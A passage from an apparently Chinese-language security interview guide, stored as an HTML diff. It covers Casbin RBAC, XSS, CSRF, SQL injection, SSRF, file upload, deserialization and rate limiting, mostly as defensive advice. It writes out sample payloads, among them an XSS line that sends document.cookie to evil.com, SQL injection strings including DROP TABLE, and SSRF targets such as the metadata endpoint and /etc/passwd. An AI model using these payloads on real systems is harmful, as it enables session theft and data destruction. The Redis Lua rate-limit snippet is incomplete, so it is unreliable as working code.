+<li>将权限建模与实现分离：策略存储（<code>model.conf</code> + <code>policy.csv</code>）与应用代码解耦</li>
+</ul>
+<p><strong>model.conf 示例（RBAC）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[request_definition]</span><br><span class="line">r = sub, obj, act</span><br><span class="line"></span><br><span class="line">[policy_definition]</span><br><span class="line">p = sub, obj, act</span><br><span class="line"></span><br><span class="line">[role_definition]</span><br><span class="line">g = _, _</span><br><span class="line"></span><br><span class="line">[policy_effect]</span><br><span class="line">e = some(where (p.eft == allow))</span><br><span class="line"></span><br><span class="line">[matchers]</span><br><span class="line">m = g(r.sub, p.sub) &amp;&amp; r.obj == p.obj &amp;&amp; r.act == p.act</span><br></pre></td></tr></table></figure>
+
+<p><strong>Casbin 特点：</strong></p>
+<ul>
+<li><strong>支持多模型</strong>：同一系统可混合使用 ACL + RBAC + ABAC</li>
+<li><strong>策略存储灵活</strong>：文件、数据库、Redis 等</li>
+<li><strong>内置角色管理器</strong>：支持角色层级、域租户</li>
+<li><strong>性能好</strong>：内存中评估，百万级策略毫秒级响应</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>Casbin vs OPA</strong>：Casbin 是<strong>库</strong>，直接嵌入应用进程。OPA 是<strong>服务</strong>（Sidecar 或独立进程）。Casbin 延迟低（无网络调用），但策略更新需要应用启动或热加载。OPA 支持策略实时变更，适合多服务统一策略。</li>
+<li><strong>Casbin 的不足</strong>：学习曲线陡峭（model.conf 语法），角色管理不够直观。不支持 ReBAC。对于复杂 ABAC 场景，OPA 更灵活。</li>
+<li><strong>适配器模式</strong>：Casbin 的策略适配器（Adapter）设计巧妙——可以对接各种存储后端，包括 MySQL、PostgreSQL、MongoDB、Redis 等。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://casbin.org/">https://casbin.org/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/casbin/casbin">https://github.com/casbin/casbin</a></li>
+</ul>
+<hr>
+<h2 id="0x02-Web-安全（OWASP-Top-10）"><a href="#0x02-Web-安全（OWASP-Top-10）" class="headerlink" title="0x02 Web 安全（OWASP Top 10）"></a>0x02 Web 安全（OWASP Top 10）</h2><h3 id="Q12：XSS（跨站脚本攻击）类型与防御"><a href="#Q12：XSS（跨站脚本攻击）类型与防御" class="headerlink" title="Q12：XSS（跨站脚本攻击）类型与防御"></a>Q12：XSS（跨站脚本攻击）类型与防御</h3><p><strong>标准答案</strong></p>
+<p><strong>三种 XSS 类型：</strong></p>
+<ol>
+<li><p><strong>反射型（Reflected XSS）</strong>：恶意脚本在 URL 参数中，服务端不经过滤直接反射到响应中。需要用户点击恶意链接。</p>
+<ul>
+<li>示例：<code>https://example.com/search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li><p><strong>存储型（Stored XSS）</strong>：恶意脚本被持久化存储到服务器（如数据库、评论系统），每次其他用户访问时执行。最危险。</p>
+<ul>
+<li>示例：用户在评论区提交 <code>&lt;script&gt;fetch(&#39;https://evil.com/steal?cookie=&#39;+document.cookie)&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li><p><strong>DOM 型（DOM-based XSS）</strong>：纯客户端攻击，恶意脚本通过修改页面 DOM 环境执行。服务端不参与。</p>
+<ul>
+<li>示例：<code>location.hash</code> 被注入 <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+</ul>
+</li>
+</ol>
+<p><strong>防御策略：</strong></p>
+<ol>
+<li><p><strong>CSP（Content Security Policy）</strong>：最有力的纵深防御手段</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;nonce-abc123&#x27;; object-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>nonce</code> 模式：只允许带有指定 nonce 的内联脚本执行</li>
+<li><code>strict-dynamic</code>：信任链传递，被信任的脚本创建的其他脚本也被信任</li>
+<li>禁止 <code>&#39;unsafe-inline&#39;</code>，除非 legacy 系统必须</li>
+</ul>
+</li>
+<li><p><strong>输出编码（Output Encoding）</strong>：根据上下文（HTML&#x2F;JS&#x2F;CSS&#x2F;URL）进行编码</p>
+<ul>
+<li>HTML 上下文：<code>&lt; → &amp;lt;</code>，<code>&gt; → &amp;gt;</code>，<code>&amp; → &amp;amp;</code></li>
+<li>JavaScript 上下文：<code>\x3C</code>、<code>\u003C</code></li>
+<li>URL 上下文：<code>encodeURIComponent()</code></li>
+</ul>
+</li>
+<li><p><strong>输入验证</strong>：验证而非过滤。白名单模式优于黑名单。</p>
+</li>
+<li><p><strong>HttpOnly Cookie</strong>：标记 Set-Cookie 为 HttpOnly，防止 JS 读取 cookie。</p>
+</li>
+<li><p><strong>X-XSS-Protection</strong>：已废弃，不建议使用。</p>
+</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>CSP 绕过</strong>：CSP 不是万能的。如果页面存在 JSONP 端点、CDN 上有已知的 Angular&#x2F;Prototype 库、或设置了过于宽松的 <code>script-src</code>（如 <code>&#39;unsafe-inline&#39;</code>，<code>&#39;unsafe-eval&#39;</code>），CSP 可以被绕过。<code>strict-dynamic</code> + <code>nonce</code> 是最安全的 CSP 配置。</li>
+<li><strong>Mutation XSS（mXSS）</strong>：利用浏览器 HTML 解析器在不同上下文下的行为差异绕过过滤。防御难度高，CSP 是最有效的屏障。</li>
+<li><strong>Library 层面的自动编码</strong>：React 默认对 JSX 表达式进行 HTML 转义；Vue 模板默认也是转义输出。但 <code>dangerouslySetInnerHTML</code> 和 <code>v-html</code> 会跳过保护。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OWASP XSS Prevention Cheat Sheet</li>
+<li>Content Security Policy (W3C)</li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+</ul>
+<h3 id="Q13：CSRF（跨站请求伪造）与防御"><a href="#Q13：CSRF（跨站请求伪造）与防御" class="headerlink" title="Q13：CSRF（跨站请求伪造）与防御"></a>Q13：CSRF（跨站请求伪造）与防御</h3><p><strong>标准答案</strong></p>
+<p><strong>CSRF 原理</strong>：用户已登录目标网站，攻击者诱导用户在不知情的情况下发起恶意请求。</p>
+<p><strong>防御手段（按推荐优先级）：</strong></p>
+<ol>
+<li><p><strong>SameSite Cookie（首选）</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: session=xxx; SameSite=Lax; Secure; HttpOnly</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>SameSite=Lax</code>：顶层导航（GET 链接、GET 表单）允许发送 cookie，POST 等改变状态的操作不允许</li>
+<li><code>SameSite=Strict</code>：完全禁止跨站发送 cookie</li>
+<li><code>SameSite=None</code>：需同时设置 <code>Secure</code>，允许跨站发送 cookie（谨慎使用）</li>
+</ul>
+</li>
+<li><p><strong>CSRF Token</strong>：</p>
+<ul>
+<li>服务端生成一个随机 token 嵌入表单或自定义 header</li>
+<li>提交请求时验证 token</li>
+<li>不适用于所有请求模式的 API；REST API 更适合使用自定义 token header</li>
+</ul>
+</li>
+<li><p><strong>Referer&#x2F;Origin 验证</strong>：</p>
+<ul>
+<li>验证 <code>Referer</code> 或 <code>Origin</code> header 是否来自可信域名</li>
+<li>但有些浏览器&#x2F;代理可能不发送 Referer header</li>
+</ul>
+</li>
+<li><p><strong>自定义 Request Header</strong>：</p>
+<ul>
+<li>对 API 强制要求 <code>X-Requested-With: XMLHttpRequest</code> 等 header</li>
+<li>浏览器跨站请求无法添加自定义 header（需 preflight）</li>
+</ul>
+</li>
+</ol>
+<p><strong>最佳实践：</strong></p>
+<ul>
+<li><strong>SPA + API 架构</strong>：使用 <code>SameSite=Lax</code> + 自定义 Header + Authorization Bearer Token（不在 cookie 中）是黄金组合</li>
+<li><strong>传统表单应用</strong>：SameSite cookie + CSRF token 双重保护</li>
+<li><strong>现代浏览器</strong>（2025+）：SameSite 默认 Lax，覆盖了绝大多数 CSRF 场景</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>SameSite 的局限性</strong>：<code>SameSite=Lax</code> 不能防御顶级导航的 GET 请求 CSRF（如 <code>GET /delete?id=1</code>），虽然 GET 不应该改变状态，但实践中很多 API 设计不当。同站子域名之间的攻击 SameSite 也防不住。</li>
+<li><strong>API-only 服务</strong>：CSRF 对纯 API 服务（移动端、服务端调用）不是问题。重点是浏览器同源策略。API 用 Bearer Token + Cookie JWT 场景才需要 CSRF 防护。</li>
+<li><strong>CSRF 与 CORS 的关系</strong>：CSRF 攻击不需要 CORS（跨域请求自动发送 cookie），而 CORS 用于跨域读取响应。CSRF 防御的核心是让浏览器不发 cookie 或者让服务端拒绝跨站请求。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OWASP CSRF Prevention Cheat Sheet</li>
+<li>RFC 6265bis - SameSite Cookies</li>
+<li><a target="_blank" rel="noopener" href="https://web.dev/articles/samesite-cookies-explained">https://web.dev/articles/samesite-cookies-explained</a></li>
+</ul>
+<h3 id="Q14：SQL-注入防御全面方案"><a href="#Q14：SQL-注入防御全面方案" class="headerlink" title="Q14：SQL 注入防御全面方案"></a>Q14：SQL 注入防御全面方案</h3><p><strong>标准答案</strong></p>
+<p><strong>防御层次（从最推荐到补充）：</strong></p>
+<ol>
+<li><p><strong>参数化查询（Prepared Statements）</strong>：最核心的防线</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java JDBC - 安全</span></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);</span><br><span class="line">ps.setInt(<span class="number">1</span>, userId);</span><br><span class="line"></span><br><span class="line"><span class="comment">// MyBatis - 安全</span></span><br><span class="line">&lt;select id=<span class="string">&quot;findUser&quot;</span> resultType=<span class="string">&quot;User&quot;</span>&gt;</span><br><span class="line">  SELECT * FROM users <span class="type">WHERE</span> <span class="variable">id</span> <span class="operator">=</span> #&#123;id&#125;   &lt;!-- #&#123;&#125; 参数化 --&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Python - 安全</span></span><br><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE id = %s&quot;</span>, (user_id,))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>MyBatis <code>#{}</code> vs <code>${}</code> 的区别</strong></p>
+<ul>
+<li><code>#{}</code>：参数化，生成 PreparedStatement，安全</li>
+<li><code>${}</code>：字符串拼接，<strong>有 SQL 注入风险</strong></li>
+<li>严禁对用户输入使用 <code>${}</code>。仅在动态表名、列名等确有必要时使用，且必须做白名单校验</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 危险 --&gt;</span></span><br><span class="line">ORDER BY $&#123;sortColumn&#125;  -- 用户可传入 &quot;id; DROP TABLE users--&quot;</span><br><span class="line"><span class="comment">&lt;!-- 相对安全：白名单 --&gt;</span></span><br><span class="line">ORDER BY </span><br><span class="line">  <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;sortColumn == &#x27;id&#x27;&quot;</span>&gt;</span>id<span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;sortColumn == &#x27;name&#x27;&quot;</span>&gt;</span>name<span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">otherwise</span>&gt;</span>id<span class="tag">&lt;/<span class="name">otherwise</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>ORM 框架安全使用</strong>：</p>
+<ul>
+<li>Hibernate&#x2F;Entity Framework 等 ORM 底层使用参数化查询，通常是安全的</li>
+<li>但原生 SQL、HQL 拼接、<code>createNativeQuery</code> 可能引入风险</li>
+<li>警惕 ORM 的 N+1 问题变成 DDoS 向量</li>
+</ul>
+</li>
+<li><p><strong>架构层防御</strong>：</p>
+<ul>
+<li><strong>最小权限数据库用户</strong>：应用数据库账号只允许必要的 DML（SELECT&#x2F;INSERT&#x2F;UPDATE&#x2F;DELETE），禁止 DDL（DROP&#x2F;ALTER&#x2F;CREATE）</li>
+<li><strong>WAF</strong>：ModSecurity 等 WAF 可以作为 SQL 注入的纵深防御层</li>
+<li><strong>输入验证</strong>：对明显的 SQL 注入模式（<code>&#39; OR 1=1--</code>、<code>UNION SELECT</code>）做输入过滤（但不可依赖，因为存在大量变体）</li>
+<li><strong>数据库连接鉴权</strong>：使用 mTLS 或 IP whitelist 限制来源</li>
+</ul>
+</li>
+<li><p><strong>错误信息处理</strong>：永远不要将数据库错误信息直接返回给用户，防止信息泄露</p>
+</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>二阶 SQL 注入</strong>：攻击者将恶意数据存入数据库，另一个查询触发。参数化查询仍然可以防御（第二次查询也是参数化的），但 ORM 的延迟加载、原生查询可能有问题。</li>
+<li><strong>NoSQL 注入</strong>：MongoDB、Elasticsearch 等 NoSQL 同样存在注入风险。MongoDB 的 <code>$where</code> 和 <code>$gte</code> 注入是典型例子。不要因为用了 NoSQL 就认为不需要参数化。</li>
+<li><strong>MyBatis 常见踩坑</strong>：<code>IN</code> 子句使用 <code>#{}</code> 会报错吗？MyBatis 3+ 支持 <code>collection</code> 遍历，<code>&lt;foreach collection=&quot;ids&quot; item=&quot;id&quot; separator=&quot;,&quot;&gt;#{id}&lt;/foreach&gt;</code> 是安全的。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OWASP SQL Injection Prevention Cheat Sheet</li>
+<li>MyBatis Dynamic SQL 文档</li>
+<li><a target="_blank" rel="noopener" href="https://bobby-tables.com/">https://bobby-tables.com/</a></li>
+</ul>
+<h3 id="Q15：SSRF（服务端请求伪造）攻击与防御"><a href="#Q15：SSRF（服务端请求伪造）攻击与防御" class="headerlink" title="Q15：SSRF（服务端请求伪造）攻击与防御"></a>Q15：SSRF（服务端请求伪造）攻击与防御</h3><p><strong>标准答案</strong></p>
+<p><strong>SSRF 原理</strong>：攻击者利用服务端发起请求的功能（如 URL 抓取、Webhook、API 代理），将目标指向内部网络或云元数据服务。</p>
+<p><strong>常见攻击目标：</strong></p>
+<ul>
+<li>云元数据：<code>http://169.254.169.254/latest/meta-data/</code>（AWS&#x2F;GCP&#x2F;Azure）</li>
+<li>内网服务：<code>http://localhost:6379</code>（Redis）、<code>http://localhost:9200</code>（Elasticsearch）</li>
+<li>内部管理接口：<code>http://internal-admin:8080/shutdown</code></li>
+<li>文件协议：<code>file:///etc/passwd</code></li>
+</ul>
+<p><strong>防御策略：</strong></p>
+<ol>
+<li><p><strong>URL 白名单</strong>：只允许请求已注册的域名&#x2F;IP 列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALLOWED_DOMAINS = [<span class="string">&#x27;api.trusted.com&#x27;</span>, <span class="string">&#x27;cdn.example.com&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> urlparse(url).hostname <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_DOMAINS:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;URL not allowed&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>内网隔离</strong>（边界防御）：</p>
+<ul>
+<li>应用部署在无外网权限的容器&#x2F;网络中</li>
+<li>使用 Kubernetes NetworkPolicy 限制出口</li>
+<li>在 VPC 级别用防火墙规则阻止出站到内网</li>
+</ul>
+</li>
+<li><p><strong>协议限制</strong>：禁止 <code>file://</code>、<code>gopher://</code>、<code>dict://</code> 等非 HTTP 协议</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALLOWED_PROTOCOLS = [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> urlparse(url).scheme <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_PROTOCOLS:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Protocol not allowed&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>DNS 解析检查</strong>：先解析域名，检查和目标 IP 是否匹配</p>
+</li>
+<li><p><strong>转发的请求中不携带敏感凭证</strong>：移除认证信息、Cookie 等</p>
+</li>
+<li><p><strong>永不信任用户提供的完整 URL</strong>：将用户输入作为参数而非路径使用</p>
+</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>SSRF 难在”盲判断”</strong>：攻击者往往看不到响应内容（Blind SSRF），但可以通过时间、错误码、DNS 回显来判断内部网络结构。防御 SSRF 时不能只依赖”返回内容安全”，还要防止信息侧信道。</li>
+<li><strong>DNS Rebinding 攻击</strong>：攻击者设置一个域名，第一次解析到白名单 IP，通过验证后再次解析到内网 IP。防御方案：在发起 HTTP 请求之前和之后都做 DNS 解析校验（double-check），或使用 IP 绑定持久连接。</li>
+<li><strong>2025 年 SSRF 趋势</strong>：云环境下的 SSRF 更危险——元数据端点（169.254.169.254）暴露的是云服务凭证（AWS IAM Role 临时凭证）。2023-2024 年 SSRF 攻击量增长了 452%。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OWASP SSRF Prevention Cheat Sheet</li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a></li>
+<li>“A New Era of SSRF” - BlackHat 2025</li>
+</ul>
+<h3 id="Q16：文件上传漏洞与防御"><a href="#Q16：文件上传漏洞与防御" class="headerlink" title="Q16：文件上传漏洞与防御"></a>Q16：文件上传漏洞与防御</h3><p><strong>标准答案</strong></p>
+<p><strong>文件上传攻击面：</strong></p>
+<ul>
+<li>Webshell 上传（<code>.php</code>、<code>.jsp</code>、<code>.asp</code>、<code>.war</code> 等可执行文件）</li>
+<li>XSS 攻击（上传 HTML&#x2F;SVG 文件包含恶意脚本）</li>
+<li>路径穿越（<code>../../../etc/passwd</code> 覆盖系统文件）</li>
+<li>大文件耗尽磁盘&#x2F;DDoS</li>
+<li>上传文件包含恶意软件&#x2F;病毒</li>
+</ul>
+<p><strong>纵深防御策略：</strong></p>
+<ol>
+<li><p><strong>文件类型校验</strong>：</p>
+<ul>
+<li><strong>MIME 类型检查</strong>（但容易被伪造）：<code>Content-Type: image/jpeg</code></li>
+<li><strong>魔数签名检查（Magic Bytes）</strong>：检查文件头部字节</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JPEG 魔数</span></span><br><span class="line">validate_magic_bytes(file, <span class="string">b&#x27;\xFF\xD8\xFF&#x27;</span>)</span><br><span class="line"><span class="comment"># PNG</span></span><br><span class="line">validate_magic_bytes(file, <span class="string">b&#x27;\x89PNG\r\n\x1a\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>存储安全</strong>：</p>
+<ul>
+<li>文件名重命名（UUID 或哈希），不使用用户提供的原始文件名</li>
+<li>文件存储到外部存储（S3&#x2F;MinIO），不放置在 web root 下</li>
+<li>设置不可执行权限</li>
+</ul>
+</li>
+<li><p><strong>内容安全</strong>：</p>
+<ul>
+<li>对图片重新编码（Reresize + Recompress），清除潜在 payload</li>
+<li>对 SVG&#x2F;HTML 文件进行 XSS 过滤</li>
+<li>PDF 文件渲染时使用沙箱</li>
+</ul>
+</li>
+<li><p><strong>大小限制</strong>：前端+后端双重限制文件大小</p>
+</li>
+<li><p><strong>访问控制</strong>：</p>
+<ul>
+<li>文件访问路径使用随机 token 而非顺序 ID</li>
+<li>上传后不直接返回可访问 URL，而是通过中间层鉴权</li>
+</ul>
+</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>文件上传 + CDN 场景</strong>：文件上传到 S3 后通过 CDN 分发，攻击者无法访问 web root，但需要防范 CDN 上的缓存投毒和未授权访问。</li>
+<li><strong>图片重编码的陷阱</strong>：攻击者可以在图片中嵌入 EXIF 数据存储 payload。重编码（re-encoding）可以清除 EXIF，但 WebP 和 AVIF 等现代格式可能有不同的处理方式。</li>
+<li><strong>SVG 上传风险</strong>：SVG 支持 <code>&lt;script&gt;</code> 标签和外部资源引用，是最危险的”图片”格式。处理 SVG 时应 strip 所有 JS 内容，禁用外部资源加载。</li>
+<li><strong>Content-Disposition 攻击</strong>：即使用户上传的是图片，下载时文件名可能被用于攻击。确保设置 <code>Content-Disposition: attachment; filename=&quot;...&quot;</code>（避免 XSS payload 伪装为 PDF 被浏览器解析）。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OWASP File Upload Prevention Cheat Sheet</li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</a></li>
+</ul>
+<h3 id="Q17：不安全的反序列化漏洞"><a href="#Q17：不安全的反序列化漏洞" class="headerlink" title="Q17：不安全的反序列化漏洞"></a>Q17：不安全的反序列化漏洞</h3><p><strong>标准答案</strong></p>
+<p><strong>原理</strong>：应用程序将不可信数据反序列化为对象时，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。</p>
+<p><strong>高危场景：</strong></p>
+<ul>
+<li><strong>Java</strong>：<code>ObjectInputStream.readObject()</code>、<code>readUnshared()</code>、XMLDecoder</li>
+<li><strong>Python</strong>：<code>pickle.loads()</code>、<code>yaml.load()</code>（非 safe_load）</li>
+<li><strong>Node.js</strong>：<code>node-serialize</code>、<code>eval()</code> 或 <code>new Function()</code> 间接</li>
+<li><strong>PHP</strong>：<code>unserialize()</code>、<code>__wakeup()</code>&#x2F;<code>__destruct()</code> 魔术方法</li>
+<li><strong>Ruby</strong>：<code>Marshal.load()</code>、<code>YAML.load()</code></li>
+</ul>
+<p><strong>经典攻击链（Java）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序列化 → commons-collections → InvokerTransformer → Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p><strong>Java 中常见的反序列化利用链：</strong></p>
+<ul>
+<li>CommonsCollections (CC)</li>
+<li>Fastjson (autoType)</li>
+<li>Jackson (enableDefaultTyping)</li>
+<li>XStream</li>
+<li>JDK 原生（<code>SignedObject</code>、<code>RMIConnectionImpl</code>）</li>
+</ul>
+<p><strong>防御策略：</strong></p>
+<ol>
+<li><strong>不使用反序列化处理不可信数据</strong>：首选 JSON 等简单格式</li>
+<li><strong>使用白名单&#x2F;黑名单过滤类</strong>（Java <code>ObjectInputFilter</code>）：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java 17+</span></span><br><span class="line"><span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> ObjectInputFilter.Config.createFilter(</span><br><span class="line">    <span class="string">&quot;!com.example.*;java.base/*;!*&quot;</span></span><br><span class="line">);</span><br><span class="line">ois.setObjectInputFilter(filter);</span><br></pre></td></tr></table></figure></li>
+<li><strong>使用替代序列化格式</strong>：Protocol Buffers、MessagePack、JSON</li>
+<li><strong>签名验证</strong>：对序列化数据添加 HMAC 签名，验证签名后再反序列化</li>
+<li><strong>使用安全的反序列化库</strong>：如 <code>YAML.safe_load()</code>、<code>json.loads()</code></li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>为什么 Java 反序列化如此脆弱？</strong> Java 的 native serialization 基于图而非树（支持循环引用），攻击面巨大。各类库的 gadgets 链不可穷尽。</li>
+<li><strong>Fastjson 案例</strong>：Fastjson 在开启了 autoType 支持后，攻击者可以通过 <code>@type</code> 指定任意类，调用其 setter&#x2F;getter 方法。即使禁用 autoType，也存在绕过手段（如缓存碰撞）。</li>
+<li><strong>Kryo 和 Protostuff</strong>：这类”更快的序列化”框架不一定更安全。它们的类注册机制可以防御一部分攻击，但如果开启了”类名可以通过数据指定”模式，风险仍然存在。</li>
+<li><strong>2025 年趋势</strong>：Kubernates 生态中的 Go 语言序列化漏洞增加，<code>encoding/gob</code> 和 <code>encoding/binary</code> 的滥用是新的攻击方向。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>OWASP Deserialization Cheat Sheet</li>
+<li>“Marshalling Pickles” (Python pickle exploits)</li>
+<li>Java ObjectInputFilter 文档</li>
+</ul>
+<hr>
+<h2 id="0x03-API-安全"><a href="#0x03-API-安全" class="headerlink" title="0x03 API 安全"></a>0x03 API 安全</h2><h3 id="Q18：API-速率限制：令牌桶、漏桶、滑动窗口"><a href="#Q18：API-速率限制：令牌桶、漏桶、滑动窗口" class="headerlink" title="Q18：API 速率限制：令牌桶、漏桶、滑动窗口"></a>Q18：API 速率限制：令牌桶、漏桶、滑动窗口</h3><p><strong>标准答案</strong></p>
+<p><strong>三种算法比较：</strong></p>
+<ol>
+<li><p><strong>令牌桶（Token Bucket）</strong>：</p>
+<ul>
+<li>桶容量 &#x3D; 最大突发量，速率 &#x3D; 令牌填充速率</li>
+<li>允许突发（桶满时突发请求），平均速率受控</li>
+<li>适合：Web API、正常流量有突发但整体可控的场景</li>
+</ul>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Redis Lua 实现（核心逻辑）</span></span><br><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">local</span> rate = <span class="built_in">tonumber</span>(ARGV[<span class="number">1</span>])     <span class="comment">-- 每秒放多少token</span></span><br><span class="line"><span class="keyword">local</span> capacity = <span class="built_in">tonumber</span>(ARGV[<span class="number">2</span>]) <span class="comment">-- 桶容量</span></span><br><span class="line"><span class="keyword">local</span> now = redis.call(<span class="string">&#x27;TIME&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">local</span> tokens = redis.call(<span class="string">&#x27;GET&#x27;</span>, key) <span class="keyword">or</span> capacity</span><br><span class="line">tokens = <span class="built_in">math</span>.<span class="built_in">min</span>(capacity, tokens + rate * (now - last_refill))</span><br><span class="line"><span class="keyword">if</span> tokens &lt; <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>  <span class="comment">-- 拒绝</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">redis.call(<span class="string">&#x27;SET&#x27;</span>, key, tokens - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>  <span class="comment">-- 允许</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>漏桶（Leaky Bucket）</strong>：</p>
+<ul>
+<li>请求进入桶，以固定速率”漏出”。桶满则丢弃。</li>
+<li>没有突发能力，速率完全恒定</li>
+<li>适合：需要严格平滑流量的场景（如数据库写入）</li>
+</ul>
+</li>
+<li><p><strong>滑动窗口（Sliding Window Log &#x2F; Sliding Window Counter）</strong>：</p>
+<ul>
+<li><strong>Sliding Window Log</strong>：记录每个请求的时间戳，统计窗口内请求数。精确但存储量较大。</li>
+<li><strong>Sliding Window Counter</strong>：以子窗口（如 1&#x2F;60 粒度）近似统计。性能好，略微牺牲精度。</li>
